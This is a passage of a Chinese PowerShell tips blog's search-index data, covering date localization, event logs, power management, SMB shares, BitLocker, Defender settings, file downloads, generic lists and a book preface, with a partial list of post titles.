$FirstDayOfWeek)&quot;$Date = week $week&quot; 在这里，您可以使用 $CultureName 来定义要使用的日历的文化名称。","link":"/2022/02/09/calculate-calendar-week-part-1/"},{"title":"PowerShell 技能连载 - 计算第几周（第 2 部分）","text":"在上一个技能中，我们解释了如何计算给定日期的日历周。如您所见，这取决于文化和日历设置，并且可能因文化而异。 这就是为什么还有 “ISOWeek” 的原因：它遵守 ISO 8601 并且是标准化的。不幸的是，.NET 中的经典 API 并不总是能计算出正确的 ISOWeek。 这就是为什么微软在 .NET Standard（PowerShell 7 使用的可移植 .NET）和 .NET Framework 5 中添加了一个名为 “ISOWeek” 的全新类。 下面这行代码返回任何日期的 ISOWeek（当在 PowerShell 7 中运行时）： 12PS&gt; [System.Globalization.ISOWeek]::GetWeekOfYear('2022-01-01')52 在 Windows PowerShell 中运行时，同样的代码会返回红色的异常，因为 Windows PowerShell 基于完整的 .NET Framework，而在当前版本中尚不支持此 API。","link":"/2022/02/11/calculate-calendar-week-part-2/"},{"title":"PowerShell 技能连载 - 本地化日期和时间标签（第 1 部分）","text":"Windows 内置了对各种文化的支持。以下是支持的文化列表及其简称： 123456789101112PS&gt; [System.Globalization.CultureInfo]::GetCultures('AllCultures') | Select-Object -Property Name, DisplayNameName DisplayName---- -----------aa Afaraa-DJ Afar (Djibouti)aa-ER Afar (Eritrea)aa-ET Afar (Ethiopia)af Afrikaansaf-NA Afrikaans (Namibia)af-ZA Afrikaans (South Africa)... 它还带有完全翻译的日期和时间组件表达。如果您想知道 Kikuyu（肯尼亚）中使用的工作日名称，请查找适当的文化名称（ “ki”），然后尝试以下操作： 12345678PS&gt; [System.Globalization.CultureInfo]::GetCultureInfo( 'ki' ).DateTimeFormat.DayNamesKiumiaNjumatatuNjumaineNjumatanaAramithiNjumaaNjumamothi 你甚至可以为多种语言创建一个“翻译表”，因为你在 DayNames 中看到的是一个带有数字索引的数组： 12PS&gt; [System.Globalization.CultureInfo]::GetCultureInfo( 'ki' ).DateTimeFormat.DayNames[0]Kiumia 这是一个显示英文和中文日期名称的翻译表： 1234567891011$english = [System.Globalization.CultureInfo]::GetCultureInfo( 'en' ).DateTimeFormat.DayNames$chinese = [System.Globalization.CultureInfo]::GetCultureInfo( 'zh' ).DateTimeFormat.DayNamesfor($x=0; $x-lt7; $x++){ [PSCustomObject]@{ English = $english[$x] Chinese = $chinese[$x] }} 结果如下所示： English Chinese ------- ------- Sunday 星期日 Monday 星期一 Tuesday 星期二 Wednesday 星期三 Thursday 星期四 Friday 星期五 Saturday 星期六","link":"/2022/02/15/localizing-date-and-time-labels-part-1/"},{"title":"PowerShell 技能连载 - 本地化日期和时间标签（第 2 部分）","text":"在上一个技能中，我们解释了如何查看所有受支持的 Windows 文化并让 Windows 翻译工作日名称。让我们玩得更开心一些，翻译月份名称。 这是一种特别简单的方法，可以确认您想要使用的文化的简称： 1234[System.Globalization.CultureInfo]::GetCultures('AllCultures') |Where-Object Name |Select-Object -Property Name, DisplayName |Out-GridView -Title 'Select Culture' -OutputMode Single 这将打开一个包含所有支持的文化的网格视图窗口。使用位于其顶部的空文本框来过滤文化，然后选择一个并单击右下角的确定。您需要的是要使用的文化的简称。例如，要使用俄罗斯文化，简称为 “ru”。 现在，在以下调用中替换选定的文化名称： 12345678910111213PS&gt; [System.Globalization.CultureInfo]::GetCultureInfo( 'ru' ).DateTimeFormat.MonthNamesЯнварьФевральМартАпрельМайИюньИюльАвгустСентябрьОктябрьНоябрьДекабрь 同样，您可以调整我们之前技巧中的代码来创建两种语言的翻译表： 123456789101112$english = [System.Globalization.CultureInfo]::GetCultureInfo( 'en' ).DateTimeFormat.MonthNames$russian = [System.Globalization.CultureInfo]::GetCultureInfo( 'ru' ).DateTimeFormat.MonthNamesfor($x=0; $x-lt 12; $x++){ [PSCustomObject]@{ Id = $x+1 English = $english[$x] Russian = $russian[$x] }} 结果类似这样： Id English Russian -- ------- ------- 1 January Январь 2 February Февраль 3 March Март 4 April Апрель 5 May Май 6 June Июнь 7 July Июль 8 August Август 9 September Сентябрь 10 October Октябрь 11 November Ноябрь 12 December Декабрь","link":"/2022/02/17/localizing-date-and-time-labels-part-2/"},{"title":"PowerShell 技能连载 - 奇怪的 Cmdlet：New-TemporaryFile","text":"这是一个 PowerShell（和 Windows PowerShell）中比较隐藏的 cmdlet：New-TemporaryFile。看到这样一个相对无用的 cmdlet 成为 PowerShell 的一部分，真是令人惊讶。当你查看它的源代码时，实际上它内部只是调用了一个简单的方法： 12345678910111213141516171819202122232425262728293031323334# load module that defines the function:PS C:\\&gt; New-TemporaryFile -WhatIfWhat if: Performing the operation &quot;New-TemporaryFile&quot; on target &quot;C:\\Users\\tobia\\AppData\\Local\\Temp&quot;.# dump function source code:PS C:\\&gt; ${function:New-TemporaryFile} [CmdletBinding( HelpURI='https://go.microsoft.com/fwlink/?LinkId=526726', SupportsShouldProcess=$true)] [OutputType([System.IO.FileInfo])] Param() Begin { try { if($PSCmdlet.ShouldProcess($env:TEMP)) { $tempFilePath = [System.IO.Path]::GetTempFileName() } } catch { $errorRecord = [System.Management.Automation.ErrorRecord]::new($_.Exception,&quot;NewTemporaryFileWriteError&quot;, &quot;WriteError&quot;, $env:TEMP) Write-Error -ErrorRecord $errorRecord return } if($tempFilePath) { Get-Item $tempFilePath } } 它的核心是这样的： 12PS&gt; [System.IO.Path]::GetTempFileName()C:\\Users\\tobia\\AppData\\Local\\Temp\\tmp671.tmp 方法具有误导性，因为它实际上在您每次调用它时都会创建一个新的临时文件。`New-TemporaryFile` 返回的是临时文件对象，而不是字符串路径，这更好地说明了上面的问题。它的本质上是这样的：1234567891011```powershellPS C:\\&gt; Get-Item ([System.IO.Path]::GetTempFileName()) Directory: C:\\Users\\tobia\\AppData\\Local\\TempMode LastWriteTime Length Name---- ------------- ------ -----a---- 26.01.2022 12:48 0 tmpC6DF.tmp","link":"/2022/02/21/strange-cmdlet-new-temporaryfile/"},{"title":"PowerShell 技能连载 - 检测计划外的关机","text":"如果 Windows 崩溃或意外停止，当下次重启时，它会产生一条 ID 为 41 的内核错误日志。如果您想检查回顾您的 Windows 是否正常关闭，请尝试以下代码： 123Get-EventLog -Logname System -Source &quot;Microsoft-Windows-Kernel-Power&quot; |Where-Object EventID -eq 41 |Select-Object Index,TimeWritten,Source,EventID 一种更现代且与 PowerShell 7 兼容的方式是使用 Get-WinEvent，而不是使用过滤器哈希表： 12345Get-WinEvent -FilterHashtable @{ LogName = 'System' ProviderName = 'Microsoft-Windows-Kernel-Power' Id = 41}","link":"/2022/02/23/detecting-unplanned-shutdown/"},{"title":"PowerShell 技能连载 - 检测电源状态","text":"虽然很难直接访问 Windows 电源管理 API，但还有其他 API 可以实现相同需求。以下代码返回您机器的当前电源状态。如果您使用的是笔记本电脑并且没有交流电源，它可以告诉您剩余电池电量： 12Add-Type -AssemblyName System.Windows.Forms[System.Windows.Forms.SystemInformation]::PowerStatus 结果类似这样： PowerLineStatus : Offline BatteryChargeStatus : 0 BatteryFullLifetime : -1 BatteryLifePercent : 0,45 BatteryLifeRemaining : 13498","link":"/2022/02/25/detecting-power-status/"},{"title":"PowerShell 技能连载 - 自定义基于控制台的对话框","text":"使用第三方对话框并不总是一个好的选择。复用内置的 PowerShell 对话框会更有意思。这是一个名为 Show-ConsoleDialog 的函数，您可以用各种选项灵活地构造这样的对话框。 该对话框在纯控制台环境（如 PowerShell 7 或 VSCode）和 PowerShell ISE（作为自定义对话框弹出）中同样显示良好。 123456789101112131415161718192021222324252627282930function Show-ConsoleDialog{ param ( [Parameter(Mandatory)] [string] $Message, [string] $Title = 'PowerShell', # do not use choices with duplicate first letter # submit any number of choices you want to offer [string[]] $Choice = ('Yes', 'No') ) # turn choices into ChoiceDescription objects $choices = foreach ($_ in $choice) { [System.Management.Automation.Host.ChoiceDescription]::new(&quot;&amp;$_&quot;, $_) } # translate the user choice into the name of the chosen choice $choices[$host.ui.PromptForChoice($title, $message, $choices, 1)].Label.Substring(1)} 你可以像这样使用它： 12345678910$result = Show-ConsoleDialog -Message 'Restarting Server?' -Title 'Will restart server for maintenance' -Choice 'Yes','No','Later','Never','Always'switch ($result){ 'Yes' { 'restarting' } 'No' { 'doing nothing' } 'Later' { 'ok, later' } 'Never' { 'will not ask again' } 'Always' { 'restarting without notice now and ever' }} 返回值为用户选择的名称。例如，使用 switch 语句来响应用户的选择。 另请注意，每个选项的第一个字母会变成键盘快捷键，因此不要使用具有重复首字母的选项。","link":"/2022/03/03/custom-console-based-dialog/"},{"title":"PowerShell 技能连载 - 通过 PowerShell 休眠或待机","text":"在上一个技能中，我们说明了虽然很难直接访问 Windows 电源管理 API，但还有其他 API 可以为您做到这一点。这段代码可让您将 Windows 系统关闭到所需的电源管理状态，即您可以将其休眠并使其进入无能耗状态： 1234567891011121314# use the built-in pwmgmt support in Windows FormsAdd-Type -AssemblyName System.Windows.Forms# define the power status you want to enable$PowerState = [System.Windows.Forms.PowerState]::Hibernate# allow or refuse force to be applied$Force = $false# turn off wake off capabilities as well$DisableWake = $false# apply the setting:[System.Windows.Forms.Application]::SetSuspendState($PowerState, $Force, $DisableWake)","link":"/2022/03/01/hibernate-or-standby-via-powershell/"},{"title":"PowerShell 技能连载 - 在 Windows 中用 PowerShell 来管理文件共享（第 1 部分）","text":"Windows 附带一个名为 “SMBShare” 的模块，其中包含 42 个用于管理网络共享的 cmdlet。此模块适用于 Windows PowerShell 和 PowerShell 7： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546PS&gt; Get-Command -Module SMBShareCommandType Name Version Source----------- ---- ------- ------Function Block-SmbShareAccess 2.0.0.0 SMBShareFunction Close-SmbOpenFile 2.0.0.0 SMBShareFunction Close-SmbSession 2.0.0.0 SMBShareFunction Disable-SmbDelegation 2.0.0.0 SMBShareFunction Enable-SmbDelegation 2.0.0.0 SMBShareFunction Get-SmbBandwidthLimit 2.0.0.0 SMBShareFunction Get-SmbClientConfiguration 2.0.0.0 SMBShareFunction Get-SmbClientNetworkInterface 2.0.0.0 SMBShareFunction Get-SmbConnection 2.0.0.0 SMBShareFunction Get-SmbDelegation 2.0.0.0 SMBShareFunction Get-SmbGlobalMapping 2.0.0.0 SMBShareFunction Get-SmbMapping 2.0.0.0 SMBShareFunction Get-SmbMultichannelConnection 2.0.0.0 SMBShareFunction Get-SmbMultichannelConstraint 2.0.0.0 SMBShareFunction Get-SmbOpenFile 2.0.0.0 SMBShareFunction Get-SmbServerCertificateMapping 2.0.0.0 SMBShareFunction Get-SmbServerConfiguration 2.0.0.0 SMBShareFunction Get-SmbServerNetworkInterface 2.0.0.0 SMBShareFunction Get-SmbSession 2.0.0.0 SMBShareFunction Get-SmbShare 2.0.0.0 SMBShareFunction Get-SmbShareAccess 2.0.0.0 SMBShareFunction Grant-SmbShareAccess 2.0.0.0 SMBShareFunction New-SmbGlobalMapping 2.0.0.0 SMBShareFunction New-SmbMapping 2.0.0.0 SMBShareFunction New-SmbMultichannelConstraint 2.0.0.0 SMBShareFunction New-SmbServerCertificateMapping 2.0.0.0 SMBShareFunction New-SmbShare 2.0.0.0 SMBShareFunction Remove-SmbBandwidthLimit 2.0.0.0 SMBShareFunction Remove-SmbComponent 2.0.0.0 SMBShareFunction Remove-SmbGlobalMapping 2.0.0.0 SMBShareFunction Remove-SmbMapping 2.0.0.0 SMBShareFunction Remove-SmbMultichannelConstraint 2.0.0.0 SMBShareFunction Remove-SmbServerCertificateMapping 2.0.0.0 SMBShareFunction Remove-SmbShare 2.0.0.0 SMBShareFunction Revoke-SmbShareAccess 2.0.0.0 SMBShareFunction Set-SmbBandwidthLimit 2.0.0.0 SMBShareFunction Set-SmbClientConfiguration 2.0.0.0 SMBShareFunction Set-SmbPathAcl 2.0.0.0 SMBShareFunction Set-SmbServerConfiguration 2.0.0.0 SMBShareFunction Set-SmbShare 2.0.0.0 SMBShareFunction Unblock-SmbShareAccess 2.0.0.0 SMBShareFunction Update-SmbMultichannelConnection 2.0.0.0 SMBShare 要开始学习使用这些 cmdlet，请从使用动词 “Get” 的那些开始：它们读取信息并且不会意外更改系统设置。 例如，Get-SmbShare 列出了您机器上所有可用的网络共享： 12345678910PS&gt; Get-SmbShareName ScopeName Path Description---- --------- ---- -----------ADMIN$ * C:\\WINDOWS Remoteadmi...C$ * C:\\ Standardfr...HP Universal Printing PCL 6 * S/W Laser HP,LocalsplOnly S/W Laser HPIPC$ * Remote-IPCOKI PCL6 Class Driver 2 * OKI PCL6 Class Driver 2,LocalsplOnly OKI PCL6 C...print$ * C:\\Windows\\system32\\spool\\drivers Printerdr... 要了解如何添加、配置或删除 SmbShares，请尝试查看带有名词 “smbshare” 的 cmdlet： 12345678PS&gt; Get-Command -Module SMBShare -Noun SmbShareCommandType Name Version Source----------- ---- ------- ------Function Get-SmbShare 2.0.0.0 SMBShareFunction New-SmbShare 2.0.0.0 SMBShareFunction Remove-SmbShare 2.0.0.0 SMBShareFunction Set-SmbShare 2.0.0.0 SMBShare New-SmbShare 允许您添加新的基本网络共享。在继续运行更改系统的命令之前，最好阅读 cmdlet 文档并查看包含的示例： 1PS&gt; Get-Help -Name New-SmbShare -Online 这将在您的默认浏览器中打开文档页面。该文档解释了可用的参数，并提供了如下示例： 1PS&gt; New-SmbShare -Name VMSFiles -Path C:\\ClusterStorage\\Volume1\\VMFiles -FullAccess Contoso\\Administrator, Contoso\\Contoso-HV1$ 它说明了创建新文件共享并使用访问权限保护它是多么简单。在运行命令之前，您必须调整示例的参数，并且至少更新您要共享的本地文件夹路径，以及应该具有完全访问权限的帐户名称。","link":"/2022/03/07/managing-file-shares-on-windows-with-powershell-part-1/"},{"title":"PowerShell 技能连载 - 在 Windows 中用 PowerShell 来管理文件共享（第 2 部分）","text":"在上一个技能中，我们介绍了 Windows 附带的 “SmbShare” PowerShell 模块，使您能够管理文件共享。我们学习了代表您在网络上共享的本地文件夹的 “SmbShare” 名词。今天我们来看看 “SbmMapping” 这个名词。 “SmbMapping” 名词从另一端查看共享：它表示您映射为本地驱动器的远程共享。Get-SmbMapping 列出您已映射的所有网络驱动器： 123456PS&gt; Get-SmbMappingStatus Local Path Remote Path------ ---------- -----------Disconnected Z: \\\\127.0.0.1\\c$OK Y: \\\\storage3\\scanning “New-SmbMapping“ 添加更多网络驱动器并将驱动器号映射到远程共享文件夹。这是一个映射网络驱动器并以纯文本形式提交登录凭据的示例： 12345PS&gt; New-SmbMapping -LocalPath y: -RemotePath \\\\storage3\\scanning -UserName Freddy -Password topSecret123Status Local Path Remote Path------ ---------- -----------OK y: \\\\storage3\\scanning 与往常一样，查看 cmdlet 文档可以更好地了解整个工作原理： 1PS&gt; Get-Help -Name New-SmbMapping -Online 这将在您的默认浏览器中打开一个文档页面，您可以检查可用参数并查看其他示例。 例如，您会发现 -Persistent 开关参数。它确定网络驱动器是永久可用且永久可用，还是仅用于当前会话。-SaveCredentials 将缓存输入的登录凭据，以便下次访问远程共享时不再需要密码。","link":"/2022/03/09/managing-file-shares-on-windows-with-powershell-part-2/"},{"title":"PowerShell 技能连载 - 为文件夹快速打开 PowerShell","text":"在 Windows 资源管理器中导航到文件夹时，您可以轻松打开传统的 cmd 或 PowerShell 控制台，并将当前文件夹设置为当前路径。 只需单击 Windows 资源管理器窗口中的地址栏然后输入 cmd，powershell 或 pwsh，然后按 ENTER 键。 cmd 命令将打开经典命令行，powershell 命令将打开 Windows PowerShell 控制台，pwsh 命令将打开 PowerShell 7 控制台（如果已安装）。 仅当存在具有命令名称的文件夹时，此技巧才会失败。如果您打开 Documents 文件夹，单击地址栏，然后输入 “powershell”，那么只有在任何地方都没有名为 “PowerShell” 的子文件夹时，按下 ENTER 键才会打开一个 PowerShell 控制台。因为如果有，资源管理器只会打开此文件夹。 要解决此问题，只需将 “.exe” 添加到在地址栏中输入的命令中。”powershell.exe” 始终打开 Windows PowerShell 控制台，并将当前资源管理器的文件夹设置为默认路径。","link":"/2022/03/11/quickly-open-powershell-for-folder/"},{"title":"PowerShell 技能连载 - 复位防火墙策略","text":"如果您想在 Windows 10 或 11 上将防火墙规则恢复为出厂默认设置，请让 PowerShell 运行相应的 netsh.exe 命令： 1PS&gt; netsh advfirewall reset 需要提升权限的 PowerShell。该命令将撤消自安装操作系统以来您（或安装程序）对 Windows 防火墙所做的任何更改。","link":"/2022/03/17/resetting-firewall-policy%20copy/"},{"title":"PowerShell 技能连载 - 管理 Bitlocker","text":"最好确保笔记本上的本地驱动器已加密。这可以保护您的个人数据，以防有一天笔记本被盗或被丢入垃圾堆中。 大多数现代商务笔记本都配备 TPM 芯片并支持硬盘驱动器的实时加密。Windows 附带管理硬盘加密的 PowerShell 模块 “Bitlocker”： 123456789101112131415161718PS&gt; Get-Command -Module bitlockerCommandType Name Version Source----------- ---- ------- ------Function Add-BitLockerKeyProtector 1.0.0.0 bitlockerFunction Backup-BitLockerKeyProtector 1.0.0.0 bitlockerFunction BackupToAAD-BitLockerKeyProtector 1.0.0.0 bitlockerFunction Clear-BitLockerAutoUnlock 1.0.0.0 bitlockerFunction Disable-BitLocker 1.0.0.0 bitlockerFunction Disable-BitLockerAutoUnlock 1.0.0.0 bitlockerFunction Enable-BitLocker 1.0.0.0 bitlockerFunction Enable-BitLockerAutoUnlock 1.0.0.0 bitlockerFunction Get-BitLockerVolume 1.0.0.0 bitlockerFunction Lock-BitLocker 1.0.0.0 bitlockerFunction Remove-BitLockerKeyProtector 1.0.0.0 bitlockerFunction Resume-BitLocker 1.0.0.0 bitlockerFunction Suspend-BitLocker 1.0.0.0 bitlockerFunction Unlock-BitLocker 1.0.0.0 bitlocker 确保在尝试任何这些命令之前启动提升权限的 PowerShell。例如，Get-BitlockerVolume 转储当前设置和保护状态： 1234567891011121314151617PS&gt; Get-BitLockerVolume | Select-Object -Property *ComputerName : DELL7390MountPoint : C:EncryptionMethod : XtsAes128AutoUnlockEnabled :AutoUnlockKeyStored : FalseMetadataVersion : 2VolumeStatus : FullyEncryptedProtectionStatus : OnLockStatus : UnlockedEncryptionPercentage : 100WipePercentage : 0VolumeType : OperatingSystemCapacityGB : 938,0381KeyProtector : {Tpm, RecoveryPassword} 该 cmdlet 显示当前的保护状态、采用的保护方法，EncryptionPercentage 指示加密是已完成还是仍在处理您的数据。 如果您的硬盘驱动器未加密，则应首先阅读有关 TPM 和加密的更多信息。虽然您可以使用 Enable-Bitlocker 开始加密您的硬盘驱动器，但重要的是您要完全了解所有加密原理，以免意外地把自己的电脑锁定。","link":"/2022/03/15/managing-bitlocker/"},{"title":"PowerShell 技能连载 - 复位防火墙策略","text":"如果您想在 Windows 10 或 11 上将防火墙规则恢复为出厂默认设置，请让 PowerShell 运行相应的 netsh.exe 命令： 1PS&gt; netsh advfirewall reset 需要提升权限的 PowerShell。该命令将撤消自安装操作系统以来您（或安装程序）对 Windows 防火墙所做的任何更改。","link":"/2022/03/17/resetting-firewall-policy/"},{"title":"PowerShell 技能连载 - Defender: 清空威胁列表和相关设置","text":"默认情况下，Windows Defender 会在 15 天后自动清除它识别为威胁的项目。可以使用 PowerShell 直接配置此首选项以及许多其他首选项。只需确保启动提升权限的 PowerShell。 此示例查询清除间隔，然后设置新的清除时间间隔并对其进行验证： 1234567PS&gt; (Get-MpPreference).ScanPurgeItemsAfterDelay15PS&gt; Set-MpPreference -ScanPurgeItemsAfterDelay 10PS&gt; (Get-MpPreference).ScanPurgeItemsAfterDelay10","link":"/2022/03/21/defender-purge-threat-list-and-related-settings/"},{"title":"PowerShell 技能连载 - 从 Internet 下载文件","text":"Invoke-WebRequest 不仅能向 web 服务发送请求。此 cmdlet 可以与远程系统通信并来回传输数据。这就是为什么您可以使用它以非常简单直接的方式从 Internet 下载文件： 1234567$url = 'https://www.nasa.gov/sites/default/files/thumbnails/image/iss065e009613.jpg'$destination = &quot;$env:temp\\picture_nasa.jpg&quot;Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $destinationInvoke-Item -Path $destination 第一部分下载 NASA 图片并将其保存在本地，下一部分在您的默认查看器中打开下载的图像。 请注意，Invoke-WebRequest 可能不适用于较旧的网络和 TLS 协议。 这里还有两点需要注意： -UseBasicParsing 阻止 cmdlet 使用旧的和已弃用的 “Internet Explorer” 对象模型，这种方法在近期可能导致问题。使用 IE 库从网站解析原始 HTML 曾经很有用。 Invoke-WebRequest 有个大哥叫 Invoke-RestMethod。两者的工作方式相同，但 Invoke-RestMethod 会自动将下载的数据转换为正确的格式，即 XML 或 JSON。对于此处示例中的简单二进制下载，该方法没有帮助。","link":"/2022/03/23/downloading-files-from-internet-2/"},{"title":"为《PowerShell 实战》撰序","text":"受人民邮电出版社图灵公司委托，为图灵即将在五月出版的《PowerShell 实战》（英文原版为 PowerShell for Sysadmins: Workflow Automation Made Easy）撰写序言。这是微软 MVP Adam Bertram 的大作，亚马逊评分 4.7 分。 以下是序言的全文。 推荐序 从 2016 年开始，细心的 Windows 10 用户发现，右键单击桌面的开始按钮，“命令提示符”选项不见了，取而代之的是 “Windows PowerShell”。这意味着存在多年的“小黑窗”遇到了变革。事实上，PowerShell 的第一个版本发布于 2006 年。作为新式的命令行 shell、脚本语言和配置管理框架，它已伴随我们走过 16 个年头。如今 PowerShell 已成为 Windows 高级用户、企业 IT 工程师、云服务管理员得心应手的利器。2016 年，开源及跨平台版推出后，PowerShell 在 Windows、Linux 和 macOS 平台上迎来了快速增长期，甚至使 Linux 用户成为 PowerShell 的核心用户。 PowerShell 之父 Jeffrey Snover 介绍了开发 PowerShell 项目的动机——主要是由于 Windows 和 Linux 核心架构的区别。在 Linux 上，一切管理操作的配置都是文本文件，因此所有的管理类软件其实就是处理文本文件的程序。而 Windows 其实是基于 API 的操作系统，所有的 API 返回的都是结构化的数据，因此那些 Unix 软件没什么帮助。这些需求推动了 PowerShell 的诞生。 从诞生之初，PowerShell 就具有一系列惊艳的特点。 一致性的设计，语法、命名清晰明了。 简单易学，能兼容现有的脚本程序和命令行工具。 内置丰富的标准命令 (cmdlet)，在默认环境下即可完成常见的系统管理工作。 具备完整的扩展体系 (PowerShellGet)、庞大的模块和脚本市场 (PowerShell Gallery)。 完整的强类型支持。它构建在 .NET CLR 基础之上，能接受并返回 .NET 对象。对象甚至能在管道和进程之间传递。 最新的 PowerShell 7 是开源和跨平台的，其推动的不仅是一家企业的产品，而是整个行业。 伟大的设计必然对应宏大的叙事，理论上需要一部鸿篇巨著才能将诸多特性介绍清楚。而当出版社向我推荐这本《PowerShell 实战》（英文原版名为 _PowerShell for Sysadmins: Workflow Automation Made Easy_）时，粗略浏览目录后，我感到十分惊讶——作者是如何仅用区区 200 多页的篇幅，兼顾语法基础、操作实战，以至完成大型项目？带着浓浓的好奇心，我读完了整本书。 作者的写作思路是针对 IT 系统管理员完成日常管理任务这一核心目标，循序介绍必要的知识，以任务目标为导向带领读者逐步构建实用的脚本，穿插介绍有用的技巧、设计模式和最佳实践。对于有兴趣的读者，作者还给出了获取扩展资料的指引，这是一种友好的结构。全书分为三个部分，层层递进。第一部分用近全书一半的篇幅介绍 PowerShell 语法、远程处理功能、自动化测试框架，这是一切后续行动的基础。语法部分避免“回字有四种写法”的枯燥理论，例如只介绍 [CmdletBinding()] 高级函数的编写，但不再介绍基本函数。而对错误处理，则重点着墨，有利于培养技术人员良好的素养。第二部分带领读者完成管理报表、AD 管理、Azure 管理、AWS 管理等日常管理任务，让读者在理论学习和动手实践的结合中产生现实收益。第三部分带领读者构建一款名为 PowerLab 的 PowerShell 模块，不时地放慢脚步对代码进行重构整理，使脚本随时处于可阅读、可维护的最佳状态。无论是 PowerShell 新手、高级用户，还是 IT 运维人员，都能从中受益。 致敬原著者 Adam Bertram（微软 Cloud and Datacenter Management MVP）、中文版译者安道，愿本书为你开启奇妙的 PowerShell 之旅。 吴波 微软 Cloud and Datacenter Management MVP","link":"/2022/03/23/write-preface-for-powershell-for-sysadmins-workflow-automation-made-easy/"},{"title":"PowerShell 技能连载 - 在 PowerShell 使用高效的列表","text":"默认情况下，当您定义列表、命令返回多个结果或需要在变量中存储多个内容时，PowerShell 使用简单的“对象数组”。 默认对象数组是可以的，但是一旦你创建了它们，它们的容量就不能增长。如果仍然尝试使用 “+=“ 运算符，脚本可能会突然花费很长时间或永远不会完成： 12345678910# default array$array = @()1..100000 | ForEach-Object { # += is actually creating a new array each time with one more entry # this is very slow $array += &quot;adding $_&quot;}$array.count 那是因为 “+=“ 其实是个谎言，PowerShell 实际上需要创建一个新的更大的数组并将内容从旧数组复制到新数组。如果只是几个元素，那么还好但是如果要添加的元素较多，就会导致指数级延迟。 最常见的解决方法是使用可以动态增长的 System.Collections.ArrayList 类型。您可以简单地将默认数组强制转换为这种类型。 这是一种常用的方法，速度更快： 12345678910# use a dynamically extensible array$array = [System.Collections.ArrayList]@()1..100000 | ForEach-Object { # use the Add() method instead of &quot;+=&quot; # discard the return value provided by Add() $null = $array.Add(&quot;adding $_&quot;)}$array.count 请注意它如何使用 Add() 方法而不是 “+=“ 运算符。 不过，System.Collections.ArrayList 有两个缺点：它的 Add() 方法返回添加新元素的位置，并且由于此信息没有意义，因此需要手动丢弃它，即将其分配给 $null。并且 ArrayLists 不是特定于类型的。它们可以存储任何数据类型，这使得它们虽然灵活但效率不高。 泛型列表要好得多，使用它们只是使用不同类型的问题。一方面，泛型列表可以限制为给定类型，因此它们可以以最有效的方式存储数据并提供类型安全。以下是字符串列表的示例： 12345678910# use a typed list for more efficiency$array = [System.Collections.Generic.List[string]]@()1..100000 | ForEach-Object { # typed lists support Add() as well but there is no # need to discard a return value $array.Add(&quot;adding $_&quot;)}$array.count 如果您需要一个整形列表，只需替换泛型列表类型名称中的类型： 1[System.Collections.Generic.List[int]] 强类型限制只是“可以”，而不是“必须”。如果您希望泛型列表与 ArrayList 一样灵活并接受任何类型，请使用 “object“ 类型： 1[System.Collections.Generic.List[object]]","link":"/2022/03/25/using-efficient-lists-in-powershell/"},{"title":"PowerShell 博客文章汇总 (2021-04 ~ 2022-03)","text":"2021 年 04 月 2021-04-01 查找上次登录的用户 2021-04-05 观看德国电视节目 2021-04-07 使用 NTFS 流（第 1 部分） 2021-04-09 使用 NTFS 流（第 2 部分） 2021-04-13 使用 NTFS 流（第 3 部分） 2021-04-15 使用 NTFS 流（第 4 部分） 2021-04-19 使用 NTFS 流（第 5 部分） 2021-04-21 查找系统路径 2021-04-23 识别组成员身份 2021-04-27 快速初始化多个PowerShell控制台 2021-04-29 Linux 如何保护安全字符串（实际未保护） 2021 年 05 月 2021-05-03 检测 Wi-Fi 信号强度（第 1 部分） 2021-05-05 检测 Wi-Fi 信号强度（第 2 部分） 2021-05-07 检测 Wi-Fi 信号强度（第 3 部分） 2021-05-11 更好的 PowerShell 帮助（第 1 部分） 2021-05-13 更好的 PowerShell 帮助（第 2 部分） 2021-05-17 更好的 PowerShell 帮助（第 3 部分） 2021-05-19 导出不带引号的CSV（和其他转换技巧） 2021-05-21 修复 CSV 导出（第 1 部分） 2021-05-25 修复 CSV 导出（第 2 部分） 2021-05-27 解析原始数据和日志文件（第 1 部分） 2021-05-31 解析原始数据和日志文件（第 2 部分） 2021 年 06 月 2021-06-02 评估事件日志数据（第 1 部分） 2021-06-04 评估事件日志数据（第 2 部分） 2021-06-08 评估事件日志数据（第 3 部分） 2021-06-10 原版 Windows 10 产品密钥 2021-06-14 检测 Windows 版本（第 1 部分） 2021-06-16 检测 Windows 版本（第 2 部分） 2021-06-18 检测 Windows 版本（第 3 部分） 2021-06-22 对文本做哈希 2021-06-24 排序技巧（第 1 部分） 2021-06-28 排序技巧（第 2 部分） 2021-06-30 排序技巧（第 3 部分） 2021 年 07 月 2021-07-02 排序技巧（第 4 部分） 2021-07-06 拆分而不丢失字符 2021-07-08 生日派对的琐事 2021-07-12 取证事件日志分析（第 1 部分） 2021-07-14 取证事件日志分析（第 2 部分） 2021-07-16 启用 ActiveDirectory 模块 2021-07-20 在 Windows 10 中解锁额外的 PowerShell 模块 2021-07-22 管理快捷方式文件（第 1 部分） 2021-07-26 管理快捷方式文件（第 2 部分） 2021-07-28 管理快捷方式文件（第 3 部分） 2021-07-30 在 Windows 10 上启用 Telnet 2021 年 08 月 2021-08-03 读取打印机属性（第 1 部分） 2021-08-05 读取打印机属性（第 2 部分） 2021-08-09 读取打印机属性（第 3 部分） 2021-08-11 列出网络驱动器 2021-08-13 移除网络驱动器 2021-08-17 处理控制台命令的错误 2021-08-19 显示警告对话框（第 1 部分） 2021-08-23 显示警告对话框（第 2 部分） 2021-08-25 发现公共 IP 地址 2021-08-27 使用 FTP：列出文件夹（第 1 部分） 2021-08-31 使用 FTP：下载文件（第 2 部分） 2021 年 09 月 2021-09-02 使用 FTP：下载二进制文件（第 3 部分） 2021-09-06 使用 FTP：上传文件（第 4 部分） 2021-09-08 从网站读取 HTTP 消息头 2021-09-10 Creating Dummy Test Files 2021-09-14 简单的内置密码生成器 2021-09-16 识别连上的 Domain 2021-09-20 识别本地管理员帐户 2021-09-22 识别本地管理员组 2021-09-24 重命名本地管理员账户 2021-09-28 Disabling Local “Guest” Account 2021-09-30 Taking Screenshot 2021 年 10 月 2021-10-04 Turning Text into Individual Lines (Part 1) 2021-10-06 Turning Text into Individual Lines (Part 2) 2021-10-08 Turning Text into Individual Lines (Part 3) 2021-10-12 创建动态参数 2021-10-14 将 UNIX 时间转为 DateTime 2021-10-18 将 Ticks 转换为 DateTime 2021-10-20 调整脚本性能 2021-10-22 Working with Get-WinEvent 2021-10-26 读取文本文件（快速） 2021-10-28 速度很重要 2021 年 11 月 2021-11-01 高级排序（第 1 部分） 2021-11-03 高级排序（第 2 部分） 2021-11-05 高级排序（第 3 部分） 2021-11-09 高级排序（第 4 部分） 2021-11-11 打开 Windows 设置对话框（快速）（第 1 部分） 2021-11-15 